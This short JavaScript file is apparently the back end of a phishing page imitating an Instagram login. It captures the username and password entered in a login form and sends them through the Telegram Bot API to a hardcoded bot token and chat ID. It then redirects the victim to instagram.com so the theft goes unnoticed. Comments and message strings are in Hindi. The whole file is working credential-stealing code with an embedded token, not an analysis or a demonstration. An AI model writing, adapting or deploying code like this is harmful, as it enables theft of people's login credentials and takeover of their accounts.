const token = "8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs";  
const chatId = "7008289410";    

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault(); 

    let user = document.querySelector('input[name="username"]').value;
    let pass = document.querySelector('input[name="password"]').value;

    let message = `नया लॉगिन डेटा:\nयूजरनेम: ${user}\nपासवर्ड: ${pass}`;
    
    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
    .then(response => response.json())
    .then(data => {
        console.log('सफलतापूर्वक भेज दिया गया', data);
        window.location.href = "https://instagram.com"; 
    })
    .catch(error => console.error('एरर:', error));
});
